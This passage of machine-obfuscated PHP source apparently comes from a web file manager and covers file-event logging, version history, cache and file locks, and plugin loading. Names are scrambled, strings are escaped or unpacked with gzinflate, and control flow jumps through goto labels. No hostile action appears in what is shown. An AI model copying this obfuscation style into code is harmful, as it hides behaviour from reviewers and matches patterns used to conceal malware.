eventCopy($‘àä“Ò¬) { $this->eventCreate($‘àä“Ò¬, $_SERVER[Ó¡Ÿ§‚][555]); } public function eventRename($€ë†­éŞ, $‰Ì­ŞÍ, $¨ªÇ”´) { $€ÙÓµ€Ç =& $_SERVER[Ó¡Ÿ§‚]; $ïš›¾ì© = array($€ÙÓµ€Ç[1159] => $‰Ì­ŞÍ, $€ÙÓµ€Ç[1160] => $¨ªÇ”´); return $this->addEvent($€ë†­éŞ, $€ÙÓµ€Ç[1353], $ïš›¾ì©); } public function eventAddComment($€œó«Ø‡, $õ¼Ï´»¼) { return $this->addEvent($€œó«Ø‡, $_SERVER[Ó¡Ÿ§‚][2092], $õ¼Ï´»¼); } public function eventAddDesc($ûúˆå–ø, $ã×¿Ú ×) { return $this->addEvent($ûúˆå–ø, $_SERVER[Ó¡Ÿ§‚][2093], $ã×¿Ú ×); } public function listBySource($€‚‘—ËÇ) { $ş¹«£™× =& $_SERVER[Ó¡Ÿ§‚]; $ø›’´èÜ = Model($ş¹«£™×[1338])->sourceInfo($€‚‘—ËÇ); $¬õ²ªãŸ = array($ş¹«£™×[426] => $€‚‘—ËÇ); if ($ø›’´èÜ[$ş¹«£™×[419]] == $ş¹«£™×[88]) { $õßö´ÌŒ = Model($ş¹«£™×[1338])->listSearchChildren($€‚‘—ËÇ, 20000); $õßö´ÌŒ[] = $€‚‘—ËÇ . $ş¹«£™×[378]; $¬õ²ªãŸ = array($ş¹«£™×[411] => array($ş¹«£™×[7], $õßö´ÌŒ)); } $éÄí”Ã = $this->where($¬õ²ªãŸ)->order($ş¹«£™×[2094])->selectPage(); if ($éÄí”Ã[$ş¹«£™×[366]][$ş¹«£™×[367]] == 0) { $éÄí”Ã[$ş¹«£™×[366]][$ş¹«£™×[367]] = 1; $éÄí”Ã[$ş¹«£™×[369]] = array(array($ş¹«£™×[426] => $€‚‘—ËÇ, $ş¹«£™×[2075] => $ø›’´èÜ[$ş¹«£™×[441]], $ş¹«£™×[1656] => $ø›’´èÜ[$ş¹«£™×[463]], $ş¹«£™×[431] => $ş¹«£™×[2095], $ş¹«£™×[432] => $ø›’´èÜ[$ş¹«£™×[201]], $ş¹«£™×[1658] => $ş¹«£™×[12])); } return $this->eventListParse($éÄí”Ã, $€‚‘—ËÇ); } private function eventListParse($ÌŒ‡İª“, $Ä¬˜ş®¥) { $š ¿è› =& $_SERVER[Ó¡Ÿ§‚]; $æ²¦Àä± = $ÌŒ‡İª“[$š ¿è›[369]]; $¦÷ÅŞ½Ô = array_to_keyvalue($æ²¦Àä±, $š ¿è›[12], $š ¿è›[411]); $çòİµÇö = array_to_keyvalue($æ²¦Àä±, $š ¿è›[12], $š ¿è›[2081]); foreach ($æ²¦Àä± as $˜Í¡ÏŠˆ) { $¾±ªƒèè = $˜Í¡ÏŠˆ[$š ¿è›[462]]; if ($˜Í¡ÏŠˆ[$š ¿è›[33]] == $š ¿è›[557] && isset($¾±ªƒèè[$š ¿è›[1159]])) { $¦÷ÅŞ½Ô[] = $¾±ªƒèè[$š ¿è›[1159]] . $š ¿è›[12]; $¦÷ÅŞ½Ô[] = $¾±ªƒèè[$š ¿è›[1160]] . $š ¿è›[12]; } if ($˜Í¡ÏŠˆ[$š ¿è›[33]] == $š ¿è›[2091] && isset($¾±ªƒèè[$š ¿è›[411]])) { $¦÷ÅŞ½Ô[] = $¾±ªƒèè[$š ¿è›[411]] . $š ¿è›[12]; } } $¦÷ÅŞ½Ô = array_merge($¦÷ÅŞ½Ô, $çòİµÇö, array($Ä¬˜ş®¥ . $š ¿è›[12])); $¦÷ÅŞ½Ô = array_unique($¦÷ÅŞ½Ô); $ÛÔ ®¾” = array_unique(array_to_keyvalue($æ²¦Àä±, $š ¿è›[12], $š ¿è›[1665])); $éû‰¢¿Í = Model($š ¿è›[534])->userListInfo($ÛÔ ®¾”); $›ñÑ˜¢‘ = Model($š ¿è›[824])->sourceListInfo($¦÷ÅŞ½Ô, !0); foreach ($æ²¦Àä± as &$˜Í¡ÏŠˆ) { if ($˜Í¡ÏŠˆ[$š ¿è›[33]] == $š ¿è›[557] && isset($˜Í¡ÏŠˆ[$š ¿è›[462]][$š ¿è›[1159]])) { $˜Í¡ÏŠˆ[$š ¿è›[462]][$š ¿è›[1159]] = $›ñÑ˜¢‘[$˜Í¡ÏŠˆ[$š ¿è›[462]][$š ¿è›[1159]]]; $˜Í¡ÏŠˆ[$š ¿è›[462]][$š ¿è›[1160]] = $›ñÑ˜¢‘[$˜Í¡ÏŠˆ[$š ¿è›[462]][$š ¿è›[1160]]]; } if ($˜Í¡ÏŠˆ[$š ¿è›[33]] == $š ¿è›[2091] && isset($˜Í¡ÏŠˆ[$š ¿è›[462]][$š ¿è›[411]])) { $˜Í¡ÏŠˆ[$š ¿è›[462]][$š ¿è›[411]] = $›ñÑ˜¢‘[$˜Í¡ÏŠˆ[$š ¿è›[462]][$š ¿è›[411]]]; } $˜Í¡ÏŠˆ[$š ¿è›[87]] = $›ñÑ˜¢‘[$˜Í¡ÏŠˆ[$š ¿è›[411]]]; $˜Í¡ÏŠˆ[$š ¿è›[2096]] = $›ñÑ˜¢‘[$˜Í¡ÏŠˆ[$š ¿è›[2081]]]; if ($˜Í¡ÏŠˆ[$š ¿è›[33]] == $š ¿è›[1823]) { $˜Í¡ÏŠˆ[$š ¿è›[2096]] = $˜Í¡ÏŠˆ[$š ¿è›[87]]; $˜Í¡ÏŠˆ[$š ¿è›[2081]] = $˜Í¡ÏŠˆ[$š ¿è›[2096]][$š ¿è›[411]]; $˜Í¡ÏŠˆ[$š ¿è›[87]] = !1; $˜Í¡ÏŠˆ[$š ¿è›[411]] = $š ¿è›[12]; } $˜Í¡ÏŠˆ[$š ¿è›[2026]] = $éû‰¢¿Í[$˜Í¡ÏŠˆ[$š ¿è›[1665]]]; } unset($˜Í¡ÏŠˆ); $ÌŒ‡İª“[$š ¿è›[369]] = $æ²¦Àä±; return $ÌŒ‡İª“; } public function removeBySource($‘±º’á) { $Íõé™ë¿ = array($_SERVER[Ó¡Ÿ§‚][426] => $‘±º’á); $this->where($Íõé™ë¿)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\x75\x72\143\x65\x5f\150\151\x73\x74\x6f\162\171"; public function historyCount($…æôˆíò) { $Ï¥ºë£Â =& $_SERVER[Ó¡Ÿ§‚]; if (!$…æôˆíò) { return array(); } if (is_string($…æôˆíò) || is_int($…æôˆíò)) { $…æôˆíò = array($…æôˆíò); } $©”ş®ğ = array($Ï¥ºë£Â[411], $Ï¥ºë£Â[1887] => $Ï¥ºë£Â[500]); $Ù™Ä…¬ƒ = array($Ï¥ºë£Â[411] => array($Ï¥ºë£Â[7], $…æôˆíò)); $äşÅÊ = $this->field($©”ş®ğ)->where($Ù™Ä…¬ƒ)->group($Ï¥ºë£Â[411])->select(); return array_to_keyvalue($äşÅÊ, $Ï¥ºë£Â[411], $Ï¥ºë£Â[500]); } public function addHistory($óÖ„–½, $²ëŸ× = '') { $ñÒªïå“ =& $_SERVER[Ó¡Ÿ§‚]; $Á“Íøà€ = array($ñÒªïå“[426] => $óÖ„–½[$ñÒªïå“[411]], $ñÒªïå“[1656] => isset($óÖ„–½[$ñÒªïå“[465]]) ? $óÖ„–½[$ñÒªïå“[465]] : $óÖ„–½[$ñÒªïå“[463]], $ñÒªïå“[478] => $óÖ„–½[$ñÒªïå“[477]], $ñÒªïå“[554] => $óÖ„–½[$ñÒªïå“[76]], $ñÒªïå“[2097] => $²ëŸ×); if ($GLOBALS[$ñÒªïå“[6]][$ñÒªïå“[89]][$ñÒªïå“[1216]] >= 1) { $this->historyAutoClear($Á“Íøà€[$ñÒªïå“[411]]); $this->add($Á“Íøà€); } Hook::trigger($ñÒªïå“[2098], $Á“Íøà€); Model($ñÒªïå“[2099])->eventFileEdit($óÖ„–½[$ñÒªïå“[411]]); } private function historyAutoClear($…°´•Ú) { $¨³˜§¿à =& $_SERVER[Ó¡Ÿ§‚]; $–Ì­®é = Model($¨³˜§¿à[769])->get($¨³˜§¿à[1238]); $ç«ÏàÛ¶ = $GLOBALS[$¨³˜§¿à[6]][$¨³˜§¿à[89]][$¨³˜§¿à[1216]]; $Ó‹Øİ© = $–Ì­®é == $¨³˜§¿à[1239] ? min(5, $ç«ÏàÛ¶) : $ç«ÏàÛ¶; $Ó‹Øİ© = $Ó‹Øİ© <= 0 ? 0 : $Ó‹Øİ© - 1; if ($Ó‹Øİ© >= 500) { return; } $¶·ıà²º = array($¨³˜§¿à[426] => $…°´•Ú); $ù³‰Î× = $this->field($¨³˜§¿à[2100])->where($¶·ıà²º)->order($¨³˜§¿à[2094])->select(); if (!$ù³‰Î× || $Ó‹Øİ© >= count($ù³‰Î×)) { return; } $Óàšú—â = array_to_keyvalue($ù³‰Î×, $¨³˜§¿à[12], $¨³˜§¿à[399]); $Óàšú—â = array_slice($Óàšú—â, $Ó‹Øİ©); $ÔúÃÂä = array_to_keyvalue($ù³‰Î×, $¨³˜§¿à[12], $¨³˜§¿à[477]); $ÔúÃÂä = array_slice($ÔúÃÂä, $Ó‹Øİ©); if (!$Óàšú—â || !$ÔúÃÂä) { return; } $¶·ıà²º = array($¨³˜§¿à[428] => array($¨³˜§¿à[7], $Óàšú—â)); $this->where($¶·ıà²º)->delete(); Model($¨³˜§¿à[480])->remove($ÔúÃÂä); } public function listData($°ÃşåÙ´) { $Ò‡ìŒôØ =& $_SERVER[Ó¡Ÿ§‚]; $…ÁÆÈ¬’ = array($Ò‡ìŒôØ[426] => $°ÃşåÙ´); $©ıéßğ¹ = $Ò‡ìŒôØ[2101]; $±™˜²Öî = $this->field($©ıéßğ¹)->where($…ÁÆÈ¬’)->order($Ò‡ìŒôØ[2094])->selectPage(); $this->_listAppendUser($±™˜²Öî[$Ò‡ìŒôØ[369]]); $‹£®É•° = Model($Ò‡ìŒôØ[769])->get($Ò‡ìŒôØ[1238]); $ÁùóĞ¯Ğ = 5; if ($‹£®É•° == $Ò‡ìŒôØ[1239]) { $±™˜²Öî[$Ò‡ìŒôØ[369]] = array_slice($±™˜²Öî[$Ò‡ìŒôØ[369]], 0, $ÁùóĞ¯Ğ); $±™˜²Öî[$Ò‡ìŒôØ[366]] = array($Ò‡ìŒôØ[2102] => 1, $Ò‡ìŒôØ[2103] => 20, $Ò‡ìŒôØ[2104] => 1, $Ò‡ìŒôØ[2105] => count($±™˜²Öî[$Ò‡ìŒôØ[369]])); } return $±™˜²Öî; } protected function _listAppendUser(&$ğŒæ±‘) { $Š§»ßè¬ =& $_SERVER[Ó¡Ÿ§‚]; $³İªˆå÷ = array_to_keyvalue($ğŒæ±‘, $Š§»ßè¬[12], $Š§»ßè¬[1665]); $Œâ–¤˜ = Model($Š§»ßè¬[534])->userListInfo($³İªˆå÷); foreach ($ğŒæ±‘ as &$…á’÷õ†) { $çĞšæÉ¢ = $…á’÷õ†[$Š§»ßè¬[1665]]; $…á’÷õ†[$Š§»ßè¬[463]] = $Œâ–¤˜[$çĞšæÉ¢] ? $Œâ–¤˜[$çĞšæÉ¢] : !1; } unset($…á’÷õ†); } public function fileInfo($õªäà ) { $ñ›òªëÆ =& $_SERVER[Ó¡Ÿ§‚]; $åÖÜÕÀ = $this->tablePrefix; $Ûµ¬ı¶¨ = "{$åÖÜÕÀ}\x69\x6f\137\x66\151\x6c\145\40\x66\151\x6c\145\163\40\157\x6e\x20\146\x69\154\145\163\56\146\151\x6c\145\111\x44\x20\75\40\x68\151\x73\x74\x6f\x72\171\56\x66\x69\154\145\x49\104"; return $this->alias($ñ›òªëÆ[2106])->where(array($ñ›òªëÆ[428] => $õªäà ))->join($Ûµ¬ı¶¨, $ñ›òªëÆ[2107])->find(); } public function removeItem($ØœáŒÓ¢) { $É¬‰€œÅ =& $_SERVER[Ó¡Ÿ§‚]; $ãìô«ºÀ = array($É¬‰€œÅ[428] => $ØœáŒÓ¢); $ºÊì›Œé = $this->where($ãìô«ºÀ)->find(); if ($ºÊì›Œé) { $©…÷È¨ = $this->where($ãìô«ºÀ)->delete(); Model($É¬‰€œÅ[480])->remove($ºÊì›Œé[$É¬‰€œÅ[477]]); return $©…÷È¨; } return !1; } public function removeBySource($İŸÍìøî) { $Ä™ÊôÀÍ =& $_SERVER[Ó¡Ÿ§‚]; if (!$İŸÍìøî) { return !1; } if (!is_array($İŸÍìøî)) { $İŸÍìøî = array($İŸÍìøî); } $„ÈÊÃ = array($Ä™ÊôÀÍ[426] => array($Ä™ÊôÀÍ[7], $İŸÍìøî)); $±§Ê™Šî = $this->field($Ä™ÊôÀÍ[478])->where($„ÈÊÃ)->select(); if ($±§Ê™Šî) { $this->where($„ÈÊÃ)->delete(); $£È×–è = array_to_keyvalue($±§Ê™Šî, $Ä™ÊôÀÍ[12], $Ä™ÊôÀÍ[477]); Model($Ä™ÊôÀÍ[480])->remove($£È×–è); } return !0; } public function setDetail($§ÍæŠŞ, $ÌôÚˆÔ) { $¼à‚ûï× =& $_SERVER[Ó¡Ÿ§‚]; return $this->where(array($¼à‚ûï×[428] => $§ÍæŠŞ))->save(array($¼à‚ûï×[2097] => $ÌôÚˆÔ)); } public function rollbackToItem($øœõÁõæ, $‰õÓ…£¡) { $›ûÑò€¸ =& $_SERVER[Ó¡Ÿ§‚]; $¼ØçüÉí = Model($›ûÑò€¸[824])->sourceInfo($øœõÁõæ); $this->addHistory($¼ØçüÉí, LNG($›ûÑò€¸[2108])); $êâ²â¿‘ = $this->find($‰õÓ…£¡); $úş—ƒä = array($›ûÑò€¸[477] => $êâ²â¿‘[$›ûÑò€¸[477]], $›ûÑò€¸[76] => $êâ²â¿‘[$›ûÑò€¸[76]], $›ûÑò€¸[85] => time(), $›ûÑò€¸[465] => USER_ID); Model($›ûÑò€¸[824])->where(array($›ûÑò€¸[411] => $øœõÁõæ))->save($úş—ƒä); return $this->where(array($›ûÑò€¸[428] => $‰õÓ…£¡))->delete(); } public function clearSame($—âßû×ª) { $ñšØŸç” =& $_SERVER[Ó¡Ÿ§‚]; $¾£¼ â = $this->listData($—âßû×ª); $²Æïğ£í = array_to_keyvalue_group($¾£¼ â, $ñšØŸç”[477]); $»ë³İ¤¬ = array(); $ÕŒÚùÀ× = array(); foreach ($²Æïğ£í as $Õ¬»¹³) { if (!$Õ¬»¹³ || count($Õ¬»¹³) <= 1) { continue; } foreach ($Õ¬»¹³ as $ÊÀ…›äµ) { $»ë³İ¤¬[] = $ÊÀ…›äµ[$ñšØŸç”[477]]; $ÕŒÚùÀ×[] = $ÊÀ…›äµ[$ñšØŸç”[399]]; } } if (!$ÕŒÚùÀ×) { return; } $this->where(array($ñšØŸç”[399] => array($ñšØŸç”[7], $ÕŒÚùÀ×)))->delete(); Model($ñšØŸç”[480])->remove($»ë³İ¤¬); } public function userSpace() { $Àë†½®— =& $_SERVER[Ó¡Ÿ§‚]; $“ãÏ’æ» = $this->tablePrefix; $Ü–ùšÚä = array($Àë†½®—[1656] => USER_ID); $ë¹ğ£î = "{$“ãÏ’æ»}\x69\x6f\x5f\x66\151\154\x65\40\146\151\x6c\x65\163\x20\x6f\x6e\40\146\151\154\145\163\x2e\x66\x69\154\x65\x49\x44\x20\75\x20\150\x69\163\164\157\162\171\x2e\x66\x69\154\x65\x49\104"; return $this->alias($Àë†½®—[2106])->where($Ü–ùšÚä)->join($ë¹ğ£î, $Àë†½®—[2107])->sum($Àë†½®—[76]); } } goto câª˜Î†èÚ; e„Ÿøñ™­ô: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $é¼Şáã =& $_SERVER[Ó¡Ÿ§‚]; if (self::$handle) { return self::$handle; } $ÕÏè½±Ğ = $GLOBALS[$é¼Şáã[6]][$é¼Şáã[349]]; self::$timeout = $ÕÏè½±Ğ[$é¼Şáã[839]] ? $ÕÏè½±Ğ[$é¼Şáã[839]] : 10; $°ùÂè³¢ = _get($GLOBALS[$é¼Şáã[6]], $é¼Şáã[840]); $Œ¾ë–È = $ÕÏè½±Ğ[$é¼Şáã[826]] ? $ÕÏè½±Ğ[$é¼Şáã[826]] : $é¼Şáã[200]; if ($Œ¾ë–È == $é¼Şáã[21] && $°ùÂè³¢ == $é¼Şáã[13]) { $Œ¾ë–È = $é¼Şáã[200]; } switch ($Œ¾ë–È) { case $é¼Şáã[829]: self::$handle = new CacheLockRedis(); break; case $é¼Şáã[830]: self::$handle = new CacheLockMemcached(); break; case $é¼Şáã[21]: self::$handle = new CacheLockDatabase(); break; case $é¼Şáã[200]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($é¼Şáã[841], $é¼Şáã[842]); } return self::$handle; } private static function key($¤úŸŸÂ˜) { return $_SERVER[Ó¡Ÿ§‚][843] . Cache::key($¤úŸŸÂ˜); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($¯æÃ‰ŠÖ = '') { self::$errorMsg = $¯æÃ‰ŠÖ; } public static function lockGlobal($ıÒ„†­™, $ÜŞÌõ‚) { return self::lock($ıÒ„†­™, $ÜŞÌõ‚, !0); } public static function lock($œ¼›õŒâ, $èŠ®õÈÛ = false, $ãß¯²‡ = false) { $µ¡ÖëÌğ =& $_SERVER[Ó¡Ÿ§‚]; $·´ü±Æ¤ = self::init(); $ìÏÏêÃò = self::key($œ¼›õŒâ); $èŠ®õÈÛ = $èŠ®õÈÛ ? $èŠ®õÈÛ : self::$timeout; $²‡ü‚ßÉ = timeFloat(); $ûû±Œ—¯ = $·´ü±Æ¤->lock($ìÏÏêÃò, $èŠ®õÈÛ); $Öß£áó = timeFloat(); if (!$ûû±Œ—¯) { $§»¯ú¼Æ = "\154\157\x63\x6b\40\x65\162\162\x6f\x72\x3b\153\x65\171\75{$œ¼›õŒâ}\73\164\151\x6d\x65\x3d{$èŠ®õÈÛ}\73" . self::$errorMsg . $µ¡ÖëÌğ[71] . get_caller_msg(); $Çø¬âü = LNG($µ¡ÖëÌğ[844]) . "\x28{$èŠ®õÈÛ}\163\51\x2e" . LNG($µ¡ÖëÌğ[845]); $Çø¬âü .= $µ¡ÖëÌğ[846]; if (is_string(self::$errorMsg) && self::$errorMsg) { $Çø¬âü = $Çø¬âü . $µ¡ÖëÌğ[847] . self::$errorMsg; } write_log($µ¡ÖëÌğ[848] . sprintf($µ¡ÖëÌğ[849], timeFloat() - $²‡ü‚ßÉ) . $µ¡ÖëÌğ[850] . $§»¯ú¼Æ . $µ¡ÖëÌğ[851] . error_get_last(), $µ¡ÖëÌğ[842]); show_json($Çø¬âü, !1); } if (!$ãß¯²‡) { self::$lockItem[$ìÏÏêÃò] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $İ”ˆ°´¹ = number_format(timeFloat() - $Öß£áó, 3); write_log($µ¡ÖëÌğ[852] . $œ¼›õŒâ . $µ¡ÖëÌğ[853] . $İ”ˆ°´¹, $µ¡ÖëÌğ[842]); } return $ûû±Œ—¯; } public static function lockGet($¹ÍŞ‘’) { $ã—ø¯ = self::key($¹ÍŞ‘’); if (self::$lockItem[$ã—ø¯]) { return self::$lockItem[$ã—ø¯]; } return self::init()->lockGet($ã—ø¯); } public static function unlock($ó´øŞ²à) { $ºğÒü•’ =& $_SERVER[Ó¡Ÿ§‚]; $çş¸İÚ = self::key($ó´øŞ²à); self::$lockItem[$çş¸İÚ] = null; self::init()->unlock($çş¸İÚ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ºğÒü•’[854] . $ó´øŞ²à, $ºğÒü•’[842]); } return; } public static function unlockRuntime() { $”Ÿ±¦æÁ =& $_SERVER[Ó¡Ÿ§‚]; $ÑåÒİ£† = self::init(); $–”ÇÃ¢ = !1; foreach (self::$lockItem as $Ÿ³øç¶œ => $‚×Õïğ†) { if (!$‚×Õïğ†) { continue; } $ÑåÒİ£†->unlock($Ÿ³øç¶œ); if (!$–”ÇÃ¢) { $–”ÇÃ¢ = !0; write_log($”Ÿ±¦æÁ[855] . $Ÿ³øç¶œ . $”Ÿ±¦æÁ[71] . get_caller_msg(), $”Ÿ±¦æÁ[842]); continue; } write_log($”Ÿ±¦æÁ[855] . $Ÿ³øç¶œ, $”Ÿ±¦æÁ[842]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $Ïª¹şÁù = number_format(timeFloat() - TIME_FLOAT, 3); write_log($”Ÿ±¦æÁ[856] . $Ïª¹şÁù . $”Ÿ±¦æÁ[857] . ACTION, $”Ÿ±¦æÁ[842]); } } public static function fileLock($òİÎ˜ô) { $“©şÓ‡¨ =& $_SERVER[Ó¡Ÿ§‚]; if (!$GLOBALS[$“©şÓ‡¨[858]]) { $GLOBALS[$“©şÓ‡¨[858]] = array(); } $GLOBALS[$“©şÓ‡¨[858]][$òİÎ˜ô] = !1; $Î™¾…ˆÇ = fopen(DATA_PATH . $òİÎ˜ô . $“©şÓ‡¨[859], $“©şÓ‡¨[860]); if (!$Î™¾…ˆÇ) { return !1; } $GLOBALS[$“©şÓ‡¨[858]][$òİÎ˜ô] = $Î™¾…ˆÇ; if (flock($Î™¾…ˆÇ, LOCK_EX)) { return !0; } self::unlock($òİÎ˜ô); show_json($“©şÓ‡¨[861], !1); return !1; } public static function fileUnlock($€‰âåÂÃ) { $ôÇÊ‹í¯ =& $_SERVER[Ó¡Ÿ§‚]; $ºØÖì‘¬ = $GLOBALS[$ôÇÊ‹í¯[858]][$€‰âåÂÃ]; if (!$ºØÖì‘¬) { return; } $GLOBALS[$ôÇÊ‹í¯[858]][$€‰âåÂÃ] = !1; flock($ºØÖì‘¬, LOCK_UN); fclose($ºØÖì‘¬); } public static function fileUnlockAll() { $Ğ–è®· =& $_SERVER[Ó¡Ÿ§‚]; if (!$GLOBALS[$Ğ–è®·[858]]) { return; } foreach ($GLOBALS[$Ğ–è®·[858]] as $¹Ú³Äæ => $®À‚Íç) { if (!$®À‚Íç) { continue; } $GLOBALS[$Ğ–è®·[858]][$¹Ú³Äæ] = !1; flock($®À‚Íç, LOCK_UN); fclose($®À‚Íç); } $GLOBALS[$Ğ–è®·[858]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $°¶êğæ“ =& $_SERVER[Ó¡Ÿ§‚]; $†œªÀŸ² = $GLOBALS[$°¶êğæ“[6]][$°¶êğæ“[349]]; self::$cachePath = $†œªÀŸ²[$°¶êğæ“[200]][$°¶êğæ“[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($»™­¯ˆş, $£¸™»‰ = 0) { $â×ì¸é§ =& $_SERVER[Ó¡Ÿ§‚]; $ÓÑ³®°ª = microtime(!0); $ñ¹ÛŒ = $ÓÑ³®°ª + $£¸™»‰ + 0.0001; $ÍØÇ§§Ï = rtrim(self::$cachePath, $â×ì¸é§[8]) . $â×ì¸é§[862] . md5($»™­¯ˆş) . $â×ì¸é§[859]; if (file_exists($ÍØÇ§§Ï) && filemtime($ÍØÇ§§Ï) && filemtime($ÍØÇ§§Ï) < time() - 10) { @unlink($ÍØÇ§§Ï); } do { if (file_exists($ÍØÇ§§Ï)) { cacheLockWait(); continue; } $…×ğ·ôö = fopen($ÍØÇ§§Ï, $â×ì¸é§[863]); if (!$…×ğ·ôö) { return !1; } $Êê”Ï¶ = flock($…×ğ·ôö, LOCK_EX | LOCK_NB); self::$caches[$»™­¯ˆş] = array($â×ì¸é§[864] => $…×ğ·ôö, $â×ì¸é§[200] => $ÍØÇ§§Ï); fwrite($…×ğ·ôö, $ñ¹ÛŒ); clearstatcache(); if ($…×ğ·ôö && $Êê”Ï¶) { return !0; } cacheLockWait(); } while (microtime(!0) < $ñ¹ÛŒ); $this->unlock($»™­¯ˆş); return !1; } public function lockGet($¹üˆ®Í¨) { $±Óá’­ =& $_SERVER[Ó¡Ÿ§‚]; $éÌÎßô× = rtrim(self::$cachePath, $±Óá’­[8]) . $±Óá’­[862] . md5($¹üˆ®Í¨) . $±Óá’­[859]; return file_exists($éÌÎßô×); } public function unlock($‰üĞ›ôÚ) { $ìÔî¡Î =& $_SERVER[Ó¡Ÿ§‚]; $¸¤é¿Ã¤ = self::$caches[$‰üĞ›ôÚ]; if (!$¸¤é¿Ã¤) { return; } @flock($¸¤é¿Ã¤[$ìÔî¡Î[864]], LOCK_UN); @fclose($¸¤é¿Ã¤[$ìÔî¡Î[864]]); @unlink($¸¤é¿Ã¤[$ìÔî¡Î[200]]); unset(self::$caches[$‰üĞ›ôÚ]); } } goto EÆÒôŸ­; e˜Ë›Ö¬”„: define($_SERVER[Ó¡Ÿ§‚][0], $_SERVER[Ó¡Ÿ§‚][1]); $_SERVER[ê¯íæ·Ş] = explode($_SERVER[Ó¡Ÿ§‚][2], gzinflate(substr($_SERVER[Ó¡Ÿ§‚][3], 10, -8))); function binCheckEq($Å¢¿˜Ô, $•Ëª•ÄÎ) { return $Å¢¿˜Ô == $•Ëª•ÄÎ; } goto E«í¡©‘»; cœ²¥‚ŠÇ¤: class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\x2e\x70\154\165\x67\x69\x6e\x4c\x69\x73\x74"; public $field = array("\156\x61\x6d\x65", "\163\x74\141\x74\165\x73", "\162\x65\147\151\145\x73\x74", "\143\x6f\x6e\x66\151\x67"); public function loadList($Ê¯€Ù­À = false) { $ó¯±ÌØ = array_to_keyvalue($this->listData(), $_SERVER[Ó¡Ÿ§‚][32]); if ($Ê¯€Ù­À) { return $ó¯±ÌØ[$Ê¯€Ù­À]; } return $ó¯±ÌØ; } public function init() { $µÖõÎ =& $_SERVER[Ó¡Ÿ§‚]; Hook::trigger($µÖõÎ[1974]); $òÛé£‰ = $this->loadPluginList(); foreach ($òÛé£‰ as $·¸«ÔÕÒ => $ú¦î³ªÑ) { $˜íÉÕÛÇ = $this->appAllow($·¸«ÔÕÒ, $ú¦î³ªÑ); if (!$˜íÉÕÛÇ) { continue; } foreach ($ú¦î³ªÑ[$µÖõÎ[1975]] as $–î­¿îÙ => $¦ã¯¾ò) { Hook::bind($–î­¿îÙ, $¦ã¯¾ò); } } Hook::trigger($µÖõÎ[1976]); Hook::trigger(ACTION); } public function appAllow($µÃÕ²è’, $¥Û·ğ°Î, $ŸïÙ¬­Õ = true) { $ºÅÊ“×¦ =& $_SERVER[Ó¡Ÿ§‚]; $ºıÑÈóş = PLUGIN_DIR . $µÃÕ²è’ . $ºÅÊ“×¦[1977]; if (!is_array($¥Û·ğ°Î) || !is_array($¥Û·ğ°Î[$ºÅÊ“×¦[1975]]) || $¥Û·ğ°Î[$ºÅÊ“×¦[748]] != 1 || !is_file($ºıÑÈóş)) { return !1; } if ($GLOBALS[$ºÅÊ“×¦[503]] == 1) { if ($GLOBALS[$ºÅÊ“×¦[6]][$ºÅÊ“×¦[1978]] || !$GLOBALS[$ºÅÊ“×¦[6]][$ºÅÊ“×¦[1979]]) { return !0; } $ÍéÏÀÙ = explode($ºÅÊ“×¦[50], strtolower($GLOBALS[$ºÅÊ“×¦[6]][$ºÅÊ“×¦[1979]])); return in_array(strtolower($µÃÕ²è’), $ÍéÏÀÙ) ? !1 : !0; } if ($ŸïÙ¬­Õ && !Action($ºÅÊ“×¦[1980])->checkAuth($µÃÕ²è’)) { return !1; } return !0; } public function unInstall($ÃàºÁ¹Á) { $‡ÁÅç™ï =& $_SERVER[Ó¡Ÿ§‚]; $‰€Æ³º = $this->loadList($ÃàºÁ¹Á); if (file_exists(PLUGIN_DIR . $ÃàºÁ¹Á)) { Hook::apply($ÃàºÁ¹Á . $‡ÁÅç™ï[1981]); } $this->remove($‰€Æ³º[$‡ÁÅç™ï[399]]); } public function changeStatus($Ï­æ¼Õ¾, $íéó†Â) { $›şíÊÏ’ =& $_SERVER[Ó¡Ÿ§‚]; $«¯¤ã—© = $this->loadList($Ï­æ¼Õ¾); if ($íéó†Â) { Hook::apply($Ï­æ¼Õ¾ . $›şíÊÏ’[1982]); } $this->update($«¯¤ã—©[$›şíÊÏ’[399]], array($›şíÊÏ’[1983] => $íéó†Â)); } public function appRegist($ùãòöŠ, $åèáãŠû) { $õŸõû—Ü =& $_SERVER[Ó¡Ÿ§‚]; $ËÆ€†¯É = $this->loadList($ùãòöŠ); if ($ËÆ€†¯É) { $this->update($ËÆ€†¯É[$õŸõû—Ü[399]], array($õŸõû—Ü[1975] => $åèáãŠû)); } else { $¤–»÷¬– = array($õŸõû—Ü[32] => $ùãòöŠ, $õŸõû—Ü[1975] => $åèáãŠû, $õŸõû—Ü[748] => 0, $õŸõû—Ü[6] => $this->getConfigDefault($ùãòöŠ)); $this->insert($¤–»÷¬–); } } public function getConfigDefault($æ×¾¾¬Í) { $Ì ƒ’éÚ =& $_SERVER[Ó¡Ÿ§‚]; $”¡ŸéÌ = array(); $Èèıëô = $this->getPackageJson($æ×¾¾¬Í); if (!$Èèıëô && is_array($Èèıëô[$Ì ƒ’éÚ[1984]])) { return $”¡ŸéÌ; } foreach ($Èèıëô[$Ì ƒ’éÚ[1984]] as $‰©Ü§»÷ => $ŞüÕ›¡§) { if (!isset($ŞüÕ›¡§[$Ì ƒ’éÚ[374]]) || isset($”¡ŸéÌ[$‰©Ü§»÷])) { continue; } $”¡ŸéÌ[$‰©Ü§»÷] = $ŞüÕ›¡§[$Ì ƒ’éÚ[374]]; } return $”¡ŸéÌ; } public function getPackageJson($…ø´İÅ) { return Hook::apply($…ø´İÅ . $_SERVER[Ó¡Ÿ§‚][1985]); } public function getConfig($ˆíïÈÇÏ, $Ù…‚¦Ã» = false) { $¿ó›ªÏ— =& $_SERVER[Ó¡Ÿ§‚]; $ŒĞ£˜İ§ = array(); $÷éÁåúü = 